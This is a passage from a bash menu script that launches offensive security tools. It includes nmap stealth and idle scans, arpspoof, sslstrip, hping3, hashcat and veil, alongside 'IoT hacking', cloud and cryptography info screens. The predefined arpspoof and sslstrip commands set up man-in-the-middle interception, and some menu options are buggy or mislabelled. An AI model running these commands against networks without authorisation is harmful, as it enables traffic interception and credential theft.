			 esac ;;
		       5)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
		         clear
			 case $b in
			 1) echo "It is used to find whether host is alive or not. if user doesnot have admin privelage then connect call is being used";;
			 2) echo "ENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
		            sudo nmap -sP $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       6)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 clear
			 case $b in
			 1) echo "Idle scanning is an advanced, highly stealthed technique, where no packets are sent to the target which can be identified to originate from the scanning machine. A zombie host (and optionally port) must be specified for this scan type. The zombie host must satisfy certain criteria essential to the workings of this scan.";;
			 2) echo -e "\e[33mENTER ZOMBIE IP ADDRESS / DOMAIN NAME";;
			 2) echo "ENTER ZOMBIE IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			    echo "ENTER HOST IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read d
			    sudo nmap -sI $c $d;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       7)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 clear
			 case $b in
			 1) echo "Version detection is the techique to find the service running on the host with its version";;
			 2) echo "ENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			    sudo nmap -sV $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       8)echo "===================================================================================================================================="
			 echo "1.ABOUT";sleep 0.10
	         	 echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
			 read b
			 clear
			 case $b in
			 1) echo "mscan used to find os type running on host. it has database of os named nmap-os-db";;
			 2) echo "ENTER IP ADDRESS / DOMAIN NAME";sleep 0.10
			    read c
			   sudo nmap -O $c;;
			 0) main_menu
			    continue ;;
			 esac ;;
		       0) main_menu 
			  continue ;;
			esac ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       nmap $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 case $z in
		 1) man veil;;
		 2) veil ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man hping3;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name/IP address:=";sleep 0.10
		       read y
		       hping3 $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       hping3 $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man arpspoof;;
		 2) echo "==========================================-=========================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter HOST IP ADDRESS:=";sleep 0.10
		       read a
		       echo "Enter TARGET IP ADDRESS:=";sleep 0.10
		       read b
		       echo "Enter Interface Name:=";sleep 0.10
		       read c
		       arpspoof -t $b -r $a -i $c ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       whois $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	      esac ;;
	   0) main_menu
	      continue ;;
	   esac ;;
	 16) echo "===================================================================================================================================="
	   echo -e "\e[32m				*** IOT HACKING *** ";echo "  ";sleep 0.10
           echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mThe Internet of things (IoT) is the network of physical devices, vehicles, home appliances, and other items embedded with electronics, software, sensors, actuators, and connectivity which enables these things to connect, collect and exchange data, creating opportunities for more direct integration of the physical world into computer-based systems, resulting in efficiency improvements, economic benefits, and reduced human exertions.
IoT involves extending Internet connectivity beyond standard devices, such as desktops, laptops, smartphones and tablets, to any range of traditionally dumb or non-internet-enabled physical devices and everyday objects. Embedded with technology, these devices can communicate and interact over the Internet, and they can be remotely monitored and controlled. With the arrival of driverless vehicles, a branch of IoT, i.e. the Internet of Vehicle starts to gain more attention.

Links:-
https://www.iotforall.com › Insights
https://nullcon.net/website/goa-2018/training/practical-iot-hacking-training.php
https://www.quora.com/What-is-IoT-Hacking";sleep 0.10;;
	   2) echo "VISIT --> https://www.secpod.com/resource/whitepapers/Hacking-IoT-A-Case-Study-on-Tata-Sky-DTH-Vulnerabilities.pdf";sleep 0.10;;
	   0) main_menu
	      continue ;;
	   esac ;;
       17) echo "===================================================================================================================================="
	   echo "				*** CLOUD COMPUTING *** ";echo "  ";sleep 0.10
           echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mThe practice of using a network of remote servers hosted on the Internet to store, manage, and process data, rather than a local server or a personal computer.Cloud computing characteristics and benefits -Elasticity,Pay per use,Workload resilience and Migration flexibility
Types of cloud services: IaaS, PaaS, and SaaS.
The first cloud computing services are barely a decade old, but already a variety of organisations—from tiny startups to global corporations, government agencies to non-profits—are embracing the technology for all sorts of reasons. 

Links:-
https://azure.microsoft.com/en-in/overview/what-is-cloud-computing/
https://www.salesforce.com/what-is-cloud-computing/
https://www.ibm.com/cloud/learn/cloud-computing
https://intellipaat.com/blog/what-is-cloud-computing/
https://www.lynda.com/IT-Infrastructure-tutorials/...Cloud-Computing.../508619-2.html";sleep 0.10;;
	   2) echo "no knowledge";sleep 0.10;;
	   0) main_menu
	      continue ;;
	   esac ;;
       18) echo "===================================================================================================================================="
	   echo "					*** CRYPTOGRAPHY *** ";echo "  ";sleep 0.10
           echo -e "\e[33m1.ABOUT";sleep 0.10
	   echo "2.TOOLS";sleep 0.10
	   echo "0.GO BACK TO MAIN MENU";sleep 0.10
	   read y
	   clear
	   case $y in
	   1) echo -e "\e[33mCryptography or cryptology is the practice and study of techniques for secure communication in the presence of third parties called adversaries.
Cryptography involves creating written or generated codes that allow information to be kept secret. Cryptography converts data into a format that is unreadable for an unauthorized user, allowing it to be transmitted without unauthorized entities decoding it back into a readable format, thus compromising the data.Cryptography is also known as cryptology.
		    Modern cryptography concerns itself with the following four objectives:
		    1.Confidentiality
		    2.Integrity
		    3.Non-repudiation 
		    4.Authentication

Links:-
Cryptography | Introduction to Crypto-terminologies - GeeksforGeeks
https://www.edureka.co/blog/what-is-cryptography/
https://www.synopsys.com/software-integrity/resources/.../cryptography.html
https://www.khanacademy.org › ... › Modern cryptography
icomp.site/what-is-cryptography";sleep 0.10;;
	   2) echo "===================================================================================================================================="
	      echo -e "\e[33m1.HASHCAT";sleep 0.10
	      echo "2.MD5";sleep 0.10
	      echo "3.SSLSTRIP";sleep 0.10
	      echo "4.ARPSPOOF";sleep 0.10
	      echo "0.GO BACK TO MAIN MENU";sleep 0.10
	      read x
	      clear
	      case $x in
	      1) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man hashcat;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter hash value:=";sleep 0.10
		       read y
		       hashcat $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       hashcat $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      2) echo "===================================================================================================================================="
		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man md5;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Domain Name:=";sleep 0.10
		       read y
		       md5 $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       md5 $l ;;
		    0) main_menu
		       continue ;;
                    esac ;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      3) echo "===================================================================================================================================="
	         echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man sslstrip;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter Port Number:=";sleep 0.10
		       read y
		       sslstrip -l $y ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       sslstrip $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      4) echo "===================================================================================================================================="
   		 echo "1.ABOUT";sleep 0.10
	         echo "2.USE";sleep 0.10;echo "0.GO BACK TO MAIN MENU";sleep 0.10
		 read z	
		 clear
		 case $z in
		 1) man arpspoof;;
		 2) echo "===================================================================================================================================="
		    echo "1.PREDEFINED COMMANDS ";sleep 0.10
		    echo "2.USERDEFINED COMMANDS";sleep 0.10
		    echo "0.GO BACK TO MAIN MENU";sleep 0.10
		    read q
		    case $q in
 		    1) echo "Enter HOST IP ADDRESS:=";sleep 0.10
		       read a
		       echo "Enter TARGET IP ADDRESS:=";sleep 0.10
		       read b
		       echo "Enter Interface Name:=";sleep 0.10
		       read c
		       arpspoof -t $b -r $a -i $c ;;
		    2) echo "Enter Your Fields";sleep 0.10
		       read l
		       whois $l ;;
		    0) main_menu
		       continue ;;
                    esac;;
		 0) main_menu
	      continue ;;
		 esac ;;
	      0) main_menu 
	         continue ;;
	      esac ;;
	 0) main_menu
            continue ;;
         esac ;;	
      19) exit ;;
esac
done
